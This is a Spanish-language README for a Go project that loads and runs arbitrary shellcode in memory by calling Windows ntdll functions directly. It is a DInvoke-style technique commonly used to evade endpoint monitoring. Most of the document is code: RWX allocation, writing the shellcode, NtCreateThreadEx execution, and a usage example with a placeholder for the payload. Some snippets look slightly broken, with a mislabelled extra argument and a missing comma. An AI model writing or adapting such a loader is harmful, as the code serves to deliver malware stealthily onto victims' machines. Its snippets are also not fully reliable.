# ShellDinvokeGo
ShelldeinvokeGo
# ExecuteShellcode

Este repositorio contiene un programa en Go que demuestra cómo ejecutar shellcode en memoria utilizando llamadas directas a la API de Windows (conocido como DInvoke). A continuación se describe en detalle el funcionamiento del código proporcionado.

## Descripción del Código

El código está diseñado para:
1. Asignar memoria virtual en el espacio de direcciones del proceso actual.
2. Escribir el shellcode proporcionado en la memoria asignada.
3. Crear un nuevo hilo en el proceso actual que ejecuta el shellcode.
4. Esperar a que el hilo termine su ejecución.
5. Liberar la memoria asignada si se produce algún error durante estos pasos.

### Estructuras y Tipos Definidos

- `HANDLE`, `PVOID`, `ULONG`, `NTSTATUS`: Tipos definidos para manejar los diferentes datos necesarios para las llamadas a la API de Windows.

### Variables Globales

- `ntdll`: Carga la librería `ntdll.dll`.
- `ntAllocateVirtualMemory`, `ntWriteVirtualMemory`, `ntCreateThreadEx`, `ntWaitForSingleObject`, `ntFreeVirtualMemory`: Definición de las funciones necesarias de `ntdll.dll`.

### Función `ExecuteShellcode`

La función `ExecuteShellcode` toma un `[]byte` que contiene el shellcode y realiza los siguientes pasos:

1. **Asignación de Memoria Virtual**
    ```go
    status, _, _ := ntAllocateVirtualMemory.Call(
        uintptr(0xFFFFFFFFFFFFFFFF),          // ProcessHandle: -1 (proceso actual)
        uintptr(unsafe.Pointer(&baseAddr)),   // BaseAddress
        uintptr(0),                           // ZeroBits
        uintptr(unsafe.Pointer(&regionSize)), // RegionSize
        uintptr(MEM_COMMIT|MEM_RESERVE),      // AllocationType
        uintptr(PAGE_EXECUTE_READWRITE),      // Protect
        uintptr(0),                           // ProcessHandle
    )
    ```

2. **Escritura en Memoria Virtual**
    ```go
    status, _, _ = ntWriteVirtualMemory.Call(
        uintptr(0xFFFFFFFFFFFFFFFF),            // ProcessHandle: -1 (proceso actual)
        uintptr(baseAddr),                      // BaseAddress
        uintptr(unsafe.Pointer(&shellcode[0])), // Buffer
        uintptr(len(shellcode)),                // BufferLength
        uintptr(unsafe.Pointer(&bytesWritten)), // NumberOfBytesWritten
        0,                                      // Reserved
    )
    ```

3. **Creación de Hilo**
    ```go
    status, _, _ = ntCreateThreadEx.Call(
        uintptr(unsafe.Pointer(&threadHandle)),
        uintptr(0x1FFFFF),           // DesiredAccess
        uintptr(0),                  // ObjectAttributes
        uintptr(0xFFFFFFFFFFFFFFFF), // ProcessHandle
        uintptr(baseAddr),           // lpStartAddress
        uintptr(0),                  // lpParameter
        uintptr(0),                  // CreateSuspended
        uintptr(0),                  // StackZeroBits
        uintptr(0),                  // SizeOfStackCommit
        uintptr(0),                  // SizeOfStackReserve
        uintptr(0),                  // bytesBuffer
    )
    ```

4. **Espera a que el Hilo Termine**
    ```go
    status, _, _ = ntWaitForSingleObject.Call(
        uintptr(threadHandle), // hObject
        uintptr(0),            // bAlertable
        uintptr(0),            // dwMilliseconds
    )
    ```

5. **Liberación de Memoria en Caso de Error**
    En caso de error en cualquiera de los pasos anteriores, se libera la memoria asignada:
    ```go
    _, _, err := ntFreeVirtualMemory.Call(
        uintptr(0xFFFFFFFFFFFFFFFF), 
        uintptr(unsafe.Pointer(&baseAddr)), 
        uintptr(unsafe.Pointer(&regionSize)), 
        uintptr(MEM_RELEASE)
    )
    ```

### Ejemplo de Uso

```go
shellcode := []byte{...} // Define tu shellcode aquí
baseAddr, err := ExecuteShellcode(shellcode)
if err != nil {
    log.Fatalf("Error ejecutando shellcode: %v", err)
}
fmt.Printf("Shellcode ejecutado en la dirección: %x\n", baseAddr)


Notas
Seguridad: Este código ejecuta shellcode arbitrario en el proceso actual, lo cual puede ser peligroso y debe manejarse con extrema precaución.
Compatibilidad: Este código está diseñado para ejecutarse en sistemas operativos Windows debido a su dependencia de la API de Windows (ntdll.dll).
Licencia
Este proyecto está licenciado bajo la MIT License.
